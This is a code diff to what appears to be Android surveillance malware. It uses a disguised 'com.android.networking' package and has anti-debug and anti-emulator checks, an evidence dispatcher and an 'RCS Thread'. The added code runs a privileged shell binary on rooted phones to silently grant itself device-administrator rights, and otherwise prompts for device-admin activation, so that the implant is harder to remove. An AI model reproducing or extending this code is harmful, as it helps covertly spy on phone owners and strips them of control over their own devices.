@@ -7,11 +7,17 @@
 
 package com.android.networking;
 
+import java.io.IOException;
+
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
@@ -20,6 +26,7 @@ import com.android.networking.action.Action;
 import com.android.networking.action.SubAction;
 import com.android.networking.action.UninstallAction;
 import com.android.networking.auto.Cfg;
+import com.android.networking.capabilities.PackageInfo;
 import com.android.networking.conf.ConfType;
 import com.android.networking.conf.Configuration;
 import com.android.networking.evidence.EvDispatcher;
@@ -27,6 +34,7 @@ import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
+import com.android.networking.listener.AR;
 import com.android.networking.listener.BSm;
 import com.android.networking.manager.ManagerEvent;
 import com.android.networking.manager.ManagerModule;
@@ -101,7 +109,7 @@ public class Core extends Activity implements Runnable {
 		}
 		
 		// ANTIDEBUG ANTIEMU
-		if(!check()){
+		if (!check()){
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start) anti emu/debug failed");
 			}
@@ -114,6 +122,7 @@ public class Core extends Activity implements Runnable {
 		eventManager = ManagerEvent.self();
 
 		contentResolver = cr;
+		
 		if (Cfg.DEBUG) {
 			coreThread.setName(getClass().getSimpleName());
 			Check.asserts(resources != null, "Null Resources"); //$NON-NLS-1$
@@ -191,6 +200,23 @@ public class Core extends Activity implements Runnable {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
 			// startTrace();
+		}
+		
+		if (PackageInfo.checkRoot()) {
+			// Usa la shell per prendere l'admin
+			try {
+				// /system/bin/ntpsvd adm "com.android.networking/com.android.networking.listener.AR"
+				Runtime.getRuntime().exec("/system/bin/ntpsvd adm \"com.android.networking/com.android.networking.listener.AR\"");
+			} catch (IOException ex) {
+				Check.log(TAG + " Error (unprotect): " + ex);
+			}
+		} else if (Cfg.ADMIN) {
+			int ACTIVATION_REQUEST = 1;
+			
+			Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+			ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
+			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
+			startActivityForResult(intent, ACTIVATION_REQUEST);
 		}
 
 		try {
